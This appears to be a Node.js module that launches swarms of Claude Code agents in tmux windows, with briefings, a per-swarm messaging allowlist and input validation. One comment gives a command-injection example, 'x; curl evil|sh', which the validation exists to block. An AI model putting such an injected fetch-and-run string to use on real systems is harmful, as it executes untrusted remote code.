'use strict';

// Conductor V2 fire control — turn a launch config into a running swarm.
//
//   plan(config)  — resolve preset/topology into the exact agents, windows, briefings and
//                   claude args that WOULD launch (no tmux, no writes — it only stats the cwd).
//                   The UI preview and the tests use this.
//   fire(config)  — write the swarm directory + briefings, then launch one managed tmux
//                   window per agent (via manage.run) and kick each off with a one-liner
//                   pointing at its briefing file.
//
// Claude-only, Fable-5-only: every window launches `claude --model claude-fable-5`. That is
// the point of V2 — maximum-power agents, no per-window model bikeshedding. Override only
// via CONDUCTOR2_MODEL (for the day a stronger model ships).

const fs = require('fs');
const path = require('path');
const os = require('os');
const { spawnSync } = require('child_process');
const manage = require('./manage');
const topologies = require('./topologies');
const presets = require('./presets');

const HOME = os.homedir();
const V2_DIR = path.join(HOME, '.conductor2');
const SWARMS_DIR = path.join(V2_DIR, 'swarms');
const BIN_DIR = path.join(V2_DIR, 'bin');
const MODEL = process.env.CONDUCTOR2_MODEL || 'claude-fable-5';
const PERMISSION_MODES = ['acceptEdits', 'default', 'plan', 'bypassPermissions'];

function sanitizeSwarm(name) {
  return String(name || '').trim().toLowerCase().replace(/[^a-z0-9_-]+/g, '-').replace(/^-+|-+$/g, '').slice(0, 24);
}

// Resolve a raw config ({ name, preset?, topology?, purpose?, agents?, cwd?, permissionMode? })
// into a complete, validated launch plan. Touches no tmux, writes no files (it does stat the cwd
// so a bad folder is refused before fire() can strand a partial swarm).
function plan(config = {}) {
  const preset = config.preset ? presets.get(config.preset) : null;
  const topoKey = config.topology || (preset && preset.topology) || 'hierarchical';
  const topo = topologies.get(topoKey);

  const swarm = sanitizeSwarm(config.name || (preset && preset.key) || 'swarm');
  if (!swarm) throw new Error('swarm needs a name');

  const purpose = String(config.purpose || (preset && preset.purpose) || '').trim();
  if (!purpose) throw new Error('swarm needs a purpose — what is this fleet for?');

  const n = Math.max(topo.minAgents, Math.min(8, parseInt(config.agents, 10) || (preset && preset.agents) || 4));
  const hints = config.roleHints || (preset && preset.roleHints) || [];

  const permissionMode = config.permissionMode || 'acceptEdits';
  if (!PERMISSION_MODES.includes(permissionMode)) throw new Error(`unknown permission mode "${permissionMode}"`);

  let cwd = String(config.cwd || '').trim() || HOME;
  cwd = cwd.replace(/^~(?=$|\/)/, HOME);
  // A nonexistent cwd doesn't fail until manage.run's `tmux new-window -c` — mid-loop, stranding a
  // partial swarm (some windows launched + kicked off, no rollback). Refuse up front instead.
  if (!fs.existsSync(cwd) || !fs.statSync(cwd).isDirectory()) throw new Error(`cwd "${cwd}" does not exist or is not a directory`);

  const model = String(config.model || '').trim() || MODEL;
  // model lands in `claude --model <x>` typed into a shell via send-keys — validate it like
  // permissionMode above, or "x; curl evil|sh" rides the fire path straight into the pane.
  if (!/^[A-Za-z0-9._-]+$/.test(model)) throw new Error(`invalid model "${model}" — letters, digits, dots, dashes and underscores only`);

  const dir = path.join(SWARMS_DIR, swarm);
  // Per-swarm message script (not the old shared one): it bakes in this swarm's member windows as
  // an allowlist, so "never message a window outside your swarm" is enforced mechanically, not by
  // prompt discipline (dogfood finding #4).
  const sayPath = path.join(dir, 'swarm-say');

  // Roles → concrete agents with window names + briefings.
  const roles = topo.roles(n, hints);
  const agents = roles.map((r) => ({ ...r, window: manage.sanitize(`${swarm}-${r.slot}`), role: r.role }));
  const ctx = { swarm, topology: topo.key, purpose, dir, sayPath, agents };

  // The swarm dir holds the briefings, notes/, and out/ handoff files, but it lives outside the
  // agents' cwd — without --add-dir, acceptEdits doesn't cover it and every stage stalls on a
  // "create stage-N.md?" prompt (dogfood finding: pipeline froze when cwd != ~).
  const claudeArgs = ['--model', model, '--add-dir', dir];
  if (permissionMode !== 'default') claudeArgs.push('--permission-mode', permissionMode);

  for (const a of agents) {
    a.briefingPath = path.join(dir, 'prompts', `${a.window}.md`);
    a.briefing = topo.briefing(ctx, a);
    a.kickoff = `You are agent "${a.window}" in swarm "${swarm}". Read ${a.briefingPath} and follow it exactly — it is your role briefing. Begin.`;
    a.claudeArgs = claudeArgs;
  }

  // Launch order: receivers before initiators, so every window an initiator might message
  // already exists when the first message fires.
  const order = [...agents.filter((a) => !a.initiator), ...agents.filter((a) => a.initiator)];

  const placeholders = (purpose.match(/<[A-Z][^>]*>/g) || []);
  return {
    swarm, topology: topo.key, purpose, cwd, permissionMode, model,
    dir, sayPath, agents, members: agents.map((a) => a.window), launchOrder: order.map((a) => a.window),
    warnings: placeholders.length ? [`purpose still contains template placeholder(s): ${placeholders.join(' ')}`] : [],
  };
}

// The per-swarm messaging helper every briefing references: `swarm-say <window> "<msg>"`.
// It's a thin shell wrapper that (1) fast-rejects any window outside this swarm's baked-in member
// allowlist, then (2) hands off to swarm-say.js, which re-checks membership against the live
// registry AND delivers through manage.deliver()'s readiness gate — so a handoff is refused (not
// silently swallowed) if the target pane is at a prompt or mid-turn (dogfood findings #4 + #5).
const SAY_HELPER = path.join(__dirname, 'swarm-say.js');
function sayScript(swarm, members) {
  const cases = members.map((w) => `    ${w}) ;;`).join('\n');
  return `#!/bin/sh
# swarm-say <window> <message...> — message a fellow agent in swarm "${swarm}".
# Members (the only valid targets): ${members.join(', ')}
[ -n "$1" ] && [ -n "$2" ] || { echo "usage: swarm-say <window> <message>" >&2; exit 1; }
W="$1"; shift
case "$W" in
${cases}
    *) echo "swarm-say: \\"$W\\" is not a member of swarm ${swarm} — refusing. Members: ${members.join(', ')}" >&2; exit 2 ;;
esac
exec node ${JSON.stringify(SAY_HELPER)} ${JSON.stringify(swarm)} "$W" "$*"
`;
}

// Write the swarm's on-disk home: mission, briefings, helper script, empty work dirs.
function writeSwarmFiles(p) {
  fs.mkdirSync(path.join(p.dir, 'prompts'), { recursive: true });
  fs.mkdirSync(path.join(p.dir, 'out'), { recursive: true });
  fs.mkdirSync(path.join(p.dir, 'notes'), { recursive: true });
  fs.writeFileSync(p.sayPath, sayScript(p.swarm, p.members), { mode: 0o755 });
  fs.writeFileSync(path.join(p.dir, 'mission.md'),
    `# Swarm: ${p.swarm}\n\n- topology: ${p.topology}\n- model: ${p.model}\n- cwd: ${p.cwd}\n- permission mode: ${p.permissionMode}\n- fired: ${new Date().toISOString()}\n\n## Purpose\n${p.purpose}\n\n## Crew\n${p.agents.map((a) => `- ${a.window} — ${a.role}`).join('\n')}\n`);
  for (const a of p.agents) fs.writeFileSync(a.briefingPath, a.briefing);
}

// Fire the swarm. Launches are non-blocking (capture:false) — manage.deliverAdopted walks each
// window through its startup prompts (folder trust) and delivers the kickoff once the prompt
// box is actually ready. Returns per-window results; ok means every window launched.
function fire(config, opts = {}) {
  const p = plan(config);
  if (!manage.hasTmux()) return { ok: false, error: 'tmux is not installed (brew install tmux).', plan: p };

  // `claude` was a silent prereq: without it every window opens, types a command the shell can't
  // find, and the swarm "launches" into N panes of `command not found`. Check the binary (or the
  // test seam's cmd) resolves on PATH before creating anything.
  const bin = String(opts.cmd || 'claude').trim().split(/\s+/)[0];
  if (spawnSync('which', [bin], { encoding: 'utf8' }).status !== 0) {
    return { ok: false, error: `\`${bin}\` is not on PATH — install the Claude Code CLI first (npm i -g @anthropic-ai/claude-code).`, plan: p };
  }

  // Refuse to fire if ANY target window name is already a live tmux window — not just registry
  // entries. BUG-4: checking only listManaged() let a manually-created window of the same name slip
  // through, so manage.run() would fail mid-loop and leave a zombie partial swarm (some windows
  // already launched + kicked off, no rollback). Pre-checking every name means fire() is all-or-nothing.
  const clash = p.agents.find((a) => manage.windowAlive(a.window));
  if (clash) return { ok: false, error: `a window named "${clash.window}" is already live in tmux. Stop it first or pick another swarm name.`, plan: p };

  writeSwarmFiles(p);

  const results = [];
  const byWindow = Object.fromEntries(p.agents.map((a) => [a.window, a]));
  for (const window of p.launchOrder) {
    const a = byWindow[window];
    const r = manage.run(a.window, a.claudeArgs, p.cwd, {
      capture: false,
      cmd: opts.cmd, // test seam — defaults to 'claude' inside manage.run
      // kickoff is persisted so a LOST kickoff (window never wrote a transcript) can be
      // re-delivered later — by /api/rekick from the board's "no transcript yet" card.
      meta: { swarm: p.swarm, role: a.role, slot: a.slot, topology: p.topology, kickoff: a.kickoff },
    });
    // kickoff travels in the result so harnesses/watchdogs can re-deliver it to a stalled window.
    results.push({ window: a.window, role: a.role, kickoff: a.kickoff, initiator: !!a.initiator, ...r });
    if (r.ok && opts.kickoff !== false) manage.deliverAdopted(a.window, a.kickoff);
  }

  const ok = results.every((r) => r.ok);
  return { ok, swarm: p.swarm, topology: p.topology, model: p.model, dir: p.dir, cwd: p.cwd, agents: results, warnings: p.warnings, attach: ok ? results[0].attach : undefined, error: ok ? undefined : results.filter((r) => !r.ok).map((r) => `${r.window}: ${r.error}`).join('; ') };
}

// Live swarms, grouped from the managed-window registry.
function listSwarms() {
  const groups = {};
  for (const w of manage.listManaged()) {
    if (!w.swarm) continue;
    (groups[w.swarm] = groups[w.swarm] || { swarm: w.swarm, topology: w.topology, dir: path.join(SWARMS_DIR, w.swarm), windows: [] })
      .windows.push({ window: w.label, role: w.role, slot: w.slot, sessionId: w.sessionId });
  }
  return Object.values(groups);
}

// Kill every window of one swarm. Irreversible — callers gate it.
function stopSwarm(name) {
  const swarm = sanitizeSwarm(name);
  const members = manage.listManaged().filter((w) => w.swarm === swarm);
  if (!members.length) return { ok: false, error: `no live swarm "${swarm}"` };
  const stopped = members.map((w) => manage.stop(w.label));
  return { ok: stopped.every((r) => r.ok), swarm, stopped: stopped.map((r) => r.label) };
}

module.exports = { plan, fire, writeSwarmFiles, listSwarms, stopSwarm, sanitizeSwarm, MODEL, PERMISSION_MODES, SWARMS_DIR, V2_DIR };
